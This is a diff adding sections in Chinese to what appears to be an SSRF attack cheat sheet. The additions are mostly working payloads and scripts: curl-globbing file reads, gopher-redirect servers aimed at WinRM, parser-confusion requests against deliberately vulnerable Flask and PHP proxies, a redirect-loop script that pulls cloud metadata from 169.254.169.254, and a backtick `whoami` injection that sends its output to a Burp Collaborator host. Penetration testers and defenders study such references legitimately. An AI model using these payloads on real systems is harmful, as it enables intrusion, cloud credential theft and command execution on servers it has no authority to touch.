@@ -111,6 +111,61 @@ gopher://0.0.0.0:27017/_<BSON payload>
 - [Gopherus](https://github.com/tarunkant/Gopherus) — 针对 MySQL、PostgreSQL、FastCGI、Redis、Zabbix、Memcache 的 Gopher Payload 自动生成
 - [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser) — Java RMI + SSRF → Gopher Payload
 
+## 3.3 Curl URL Globbing — WAF 绕过
+
+如果 SSRF 由 **curl** 执行，curl 的 [URL globbing](https://everything.curl.dev/cmdline/globbing) 特性可用于绕 WAF。例如以下利用 curl globbing 实现 `file://` 路径遍历的实例：
+
+```bash
+file:///app/public/{.}./{.}./{app/public/hello.html,flag.txt}
+```
+
+curl 将 `{.}` 展开为空字符串，`{a,b}` 展开为两个请求，最终访问到目标文件。
+
+## 3.4 SMTP 内部域名泄露
+
+通过 SSRF 连接 localhost SMTP 端口，可从 banner 中提取内部域名信息：
+
+```
+1. SSRF 连接 smtp://localhost:25
+2. 从 banner 获取: 220 internaldomain.com ESMTP Sendmail
+3. 在 GitHub 搜索 internaldomain.com 发现子域名
+4. 连接内部子域名 → 进一步信息收集
+```
+
+## 3.5 Gopher 重定向服务器
+
+当需要通过 SSRF 使用不同协议（如 gopher）时，可搭建返回 302 重定向的服务器：
+
+```python
+# Flask 版本 — HTTPS + Gopher 重定向
+from flask import Flask, redirect
+from urllib.parse import quote
+app = Flask(__name__)
+
+@app.route('/')
+def root():
+    return redirect('gopher://127.0.0.1:5985/_%50%4f%53%54...', code=301)
+
+if __name__ == "__main__":
+    app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
+```
+
+```python
+# http.server 版本 — 适用于 WinRM (5985) 等 WS-Management 服务
+from http.server import HTTPServer, BaseHTTPRequestHandler
+import ssl
+
+class MainHandler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        self.send_response(301)
+        self.send_header("Location", "gopher://127.0.0.1:5985/_<payload>")
+        self.end_headers()
+
+httpd = HTTPServer(('0.0.0.0', 443), MainHandler)
+httpd.socket = ssl.wrap_socket(httpd.socket, certfile="server.pem", server_side=True)
+httpd.serve_forever()
+```
+
 ---
 
 # 0x04 攻击向量全集
@@ -227,6 +282,42 @@ throws IOException {
 
 攻击者发送 `GET ;@evil.com/url HTTP/1.1` 时，`request.getRequestURI()` 返回 `/;@evil.com/url`，拼接后 `new URL("http://ifconfig.me/;@evil.com/url")` 中 `;` 被 Spring 解析为路径参数分隔符，`@evil.com` 成为实际请求目标。
 
+**Flask 典型漏洞代码**：
+
+```python
+from flask import Flask
+from requests import get
+
+app = Flask('__main__')
+SITE_NAME = 'https://google.com'
+
+@app.route('/', defaults={'path': ''})
+@app.route('/<path:path>')
+def proxy(path):
+    return get(f'{SITE_NAME}{path}').content
+```
+
+Flask 允许 `@` 作为路径首字符，攻击请求 `GET @evildomain.com/ HTTP/1.1` → 拼接后 `https://google.com/@evildomain.com/` → `evildomain.com` 变为 userinfo 后的实际目标。
+
+**PHP Built-in Web Server 典型漏洞代码**：
+
+```php
+<?php
+$site = "http://ifconfig.me";
+$current_uri = $_SERVER['REQUEST_URI'];
+$proxy_site = $site . $current_uri;
+$response = file_get_contents($proxy_site);
+?>
+```
+
+PHP 允许 `*` 字符出现在 `/` 之前的路径中，但有限制：仅可用于根路径 `/`，且点号 `.` 不允许出现在第一个斜杠之前，因此需使用无点十六进制 IP：
+
+```http
+GET *@0xa9fea9fe/ HTTP/1.1
+Host: target.com
+Connection: close
+```
+
 ---
 
 # 0x05 Blind SSRF
@@ -250,6 +341,30 @@ def redir():
 ```
 
 **原理**：libcurl 本身会跟随 305–310 状态码；经过 N 次奇怪重定向后，应用的 wrapper 认为"异常"并切换为调试模式，将完整重定向链 + 最终响应体返回给攻击者。
+
+完整利用脚本：
+
+```python
+@app.route("/redir")
+def redir():
+    count = int(request.args.get("count", 0)) + 1
+    weird_status = 301 + count       # 305, 306, 307, 308, 309, 310...
+    if count >= 10:
+        return redirect(METADATA_URL, 302)  # 最终跳转到真正的目标
+    return redirect(f"/redir?count={count}", weird_status)
+
+@app.route("/start")
+def start():
+    return redirect("/redir", 302)   # 初始 302 启动重定向链
+```
+
+**执行步骤**：
+
+1. 初始 302 → 应用开始跟随重定向
+2. 依次接收 305 → 306 → 307 → 308 → 309 → 310（libcurl 均会跟随）
+3. N 次异常状态码后，应用 wrapper 判定"异常"，切换为调试模式
+4. 最终 302 → `169.254.169.254` → 200 OK，在调试模式下完整回显响应内容
+5. 攻击者获取全部 header + metadata JSON
 
 ## 5.3 盲 SSRF → 时间侧信道
 
@@ -318,6 +433,33 @@ done
 - `get_headers()`
 - WordPress: `wp_remote_get()`, `wp_remote_post()`
 
+## 7.4 SSRF 与命令注入联动
+
+当 SSRF URL 参数被直接拼接到 shell 命令中时，可尝试内联命令注入：
+
+```bash
+url=http://3iufty2q67fuy2dew3yug4f34.burpcollaborator.net?`whoami`
+```
+
+如果服务端使用 `curl` 等命令行工具处理 URL 且未做 shell 转义，反引号内的命令将被执行，结果随 DNS/HTTP 外带到 Collaborator。
+
+## 7.5 HTML-to-PDF 渲染器作为盲 SSRF 利用链
+
+PDF 生成库（TCPDF、html2pdf）在将 HTML 转换为 PDF 时会**自动解析并请求所有外部资源引用**，可作为盲 SSRF 代理探测内网：
+
+```html
+<html>
+  <body>
+    <img width="1" height="1" src="http://127.0.0.1:8080/healthz">
+    <link rel="stylesheet" type="text/css" href="http://10.0.0.5/admin">
+  </body>
+</html>
+```
+
+- **TCPDF 6.10.0**：对每个 `<img>` 发起多次获取尝试（curl + getimagesize + file_get_contents），单个 payload 可产生多个探测请求
+- **html2pdf**：在 `Css::extractStyle()` 中调用 `file_get_contents($href)` 获取 CSS 外部引用，仅做浅层 scheme 检查
+- **组合利用**：结合 [HTML-to-PDF 路径遍历](../file-inclusion/README.md) 同时泄露 HTTP 响应和本地文件内容
+
 ---
 
 # 0x08 工具清单
@@ -329,6 +471,10 @@ done
 | [Singularity](https://github.com/nccgroup/singularity) | DNS Rebinding 攻击框架 | 自动化 IP 切换 + Payload 下发 |
 | [SSRF Proxy](https://github.com/bcoles/ssrf_proxy) | SSRF → HTTP 代理隧道 | 通过 SSRF 节点转发 HTTP 流量 |
 | [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser) | Java RMI SSRF Payload | 自动生成 RMI 操作的 Gopher Payload |
+| [TLS-poison](https://github.com/jmdx/TLS-poison/) | DNS Rebinding + TLS 注入 | Session ID/Ticket 内嵌入攻击 Payload |
+| [Burp-Encode-IP](https://github.com/e1abrador/Burp-Encode-IP) | IP 格式编码绕过 | 自动转换八进制/十六进制/十进制 IP |
+| [SSRF-PayloadMaker](https://github.com/hsynuzm/SSRF-PayloadMaker) | 80k+ Host 变形生成 | 混合编码、HTTP 降级、反斜杠变体 |
+| [recollapse](https://github.com/0xacb/recollapse) | 正则绕过 Fuzzer | 基于输入 URL 生成绕过变体 |
 
 ---
 
@@ -368,8 +514,16 @@ ALLOWED_HOSTS = {"api.trusted.com", "cdn.trusted.com"}  # 白名单模式优先
 # 0x0A 参考资料
 
 - [PortSwigger — SSRF](https://portswigger.net/web-security/ssrf)
+- [PortSwigger — URL Validation Bypass Cheat Sheet](https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet)
 - [PayloadsAllTheThings — SSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
-- [Assetnote — Blind SSRF Chains](https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/)
+- [Assetnote — Blind SSRF Chains via HTTP Redirect Loops](https://slcyber.io/assetnote-security-research-center/novel-ssrf-technique-involving-http-redirect-loops/)
 - [Exploiting HTTP Parsers Inconsistencies (Flask/Spring/PHP built-in server)](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies)
+- [Claroty — Exploiting URL Parsing Confusion](https://claroty.com/2022/01/10/blog-research-exploiting-url-parsing-confusion/)
 - [Gopherus Blog Post](https://spyclub.tech/2018/08/14/2018-08-14-blog-on-gopherus/)
 - [Singularity — DNS Rebinding Framework](https://github.com/nccgroup/singularity)
+- [TLS-poison — DNS Rebinding + TLS Injection](https://github.com/jmdx/TLS-poison/)
+- [recollapse — Regex Bypass Fuzzer](https://github.com/0xacb/recollapse)
+- [SSRF-PayloadMaker — 80k+ Host 变形生成器](https://github.com/hsynuzm/SSRF-PayloadMaker)
+- [Positive Technologies — Blind Trust: PDF Generation SSRF](https://swarm.ptsecurity.com/blind-trust-what-is-hidden-behind-the-process-of-creating-your-pdf-file/)
+- [Tenable — SSRF in Java TLS Handshakes (AIA CA Issuers)](https://www.tenable.com/blog/tenable-discovers-ssrf-vulnerability-in-java-tls-handshakes-that-creates-dos-risk)
+- [When Audits Fail: Pre-Auth SSRF to RCE in TRUfusion Enterprise](https://www.rcesecurity.com/2026/02/when-audits-fail-from-pre-auth-ssrf-to-rce-in-trufusion-enterprise/)
